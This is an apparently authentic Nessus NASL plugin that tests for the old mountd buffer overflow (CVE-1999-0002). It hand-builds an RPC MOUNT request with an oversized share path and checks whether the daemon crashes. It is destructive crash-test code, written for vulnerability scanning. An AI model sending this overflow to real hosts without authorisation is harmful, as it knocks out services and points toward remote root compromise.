
# An OOOOLD check.

if(description)
{
 script_id(11337);
 script_bugtraq_id(121);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CVE-1999-0002");
 
 name["english"] = "mountd overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote mount daemon seems to be vulnerable
to a buffer overflow when it receives a request for an
oversized share.

An attacker may use this flaw to gain root access
on this host

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Overflows mountd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}



include("misc_func.inc");
include("nfs_func.inc");


function naughty_mount(soc, share)
{
  local_var pad, req, len, r, ret, i;
  
  pad = padsz(len:strlen(this_host_name()));
  len = 52 + strlen(this_host_name()) + pad;
  
  req = 	   rpclong(val:rand()) +
  		   rpclong(val:0) +
		   rpclong(val:2) +
		   rpclong(val:100005) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:len) +
		   rpclong(val:rand()) +
		   rpclong(val:strlen(this_host_name())) +
		   this_host_name() +
		   rpcpad(pad:pad) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +	
		   rpclong(val:7)  +	
		   rpclong(val:0)  +	
		   rpclong(val:2)  + 	
		   rpclong(val:3)  +	
		   rpclong(val:4)  +
		   rpclong(val:5)  +
		   rpclong(val:20) +
		   rpclong(val:31) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +
		   rpclong(val:0)  +
					
		   rpclong(val:strlen(share)) +
		   share +
		   rpcpad(pad:padsz(len:strlen(share)));
		   
  send(socket:soc, data:req);
  r = recv(socket:soc, length:4096);
  if(!r) return 0;
  else return 1;
}

port = get_rpc_port(program:100005, protocol:IPPROTO_UDP);
if ( ! port ) exit(0);
soc = open_priv_sock_udp(dport:port);


if(!soc)exit(0);

if(naughty_mount(soc:soc, share:"/nessus") != 0)
{
 naughty_mount(soc:soc, share:"/" + crap(4096));
 sleep(1);
 if(naughty_mount(soc:soc, share:"/nessus") == 0)
  security_hole(port);
}
